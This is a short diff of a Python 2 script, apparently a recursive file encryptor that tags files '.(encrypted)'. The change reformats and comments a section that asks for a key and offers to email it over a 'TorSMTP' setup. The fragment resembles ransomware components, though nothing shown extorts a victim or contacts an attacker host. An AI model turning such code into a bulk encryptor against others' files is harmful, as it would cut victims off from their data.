@@ -160,19 +160,24 @@ encFiles = main()                                 # run main function recursivel
 
 if choice == "E":                                              # if choose "E"
  password = raw_input(" Enter encryption key: ")             # get keyinput from user
- print "[!] You can send the encryption key to your personal email"
- print "    via our TorSMTP configuration."
+
+ #####################
+ ##   New Section   ##############################
+ ## - SMTP service that send your Encryptio Key ##
+ ## - back to your personal EMAIL.              ##
+ #################################################
+ print "[!] You can send the encryption key to your personal email\n    via our TorSMTP configuration."
  _choice = raw_input("Would you like to send the Encryption Key? Y/N ")
- if _choice == "Y":
-  print "[+] Enter Email Information: "
-  email = raw_input("Email: ") 
-  LOADER._loader.start()
-  LOADER._loader.sleep(10)
-  LOADER._loader._done = True
-  SMTP.sendMail(email, password)
-  break
- elif _choice == "N":
-  break
+ if _choice == "Y":                         # if choose "Y"
+  print "[+] Enter Email Information: "     # interact with user 
+  email = raw_input("Email: ")              # get user input to email
+  LOADER._loader.start()                    # start loader animatio thread
+  LOADER._loader.sleep(10)                  # Animation Runtime
+  LOADER._loader._done = True               # kill animation thread
+  SMTP.sendMail(email, password)            # send email to `email` with theh encryption key
+  break                                     # exit condition
+ elif _choice == "N":                       # in choose "N"
+  break                                     # exit condition
 
  for Tfiles in endFiles:                                     # run through all target files in encrypted file list
      if os.path.basename(Tfiles).startswith(".(encrypted)"): # check if add marker to filename exist
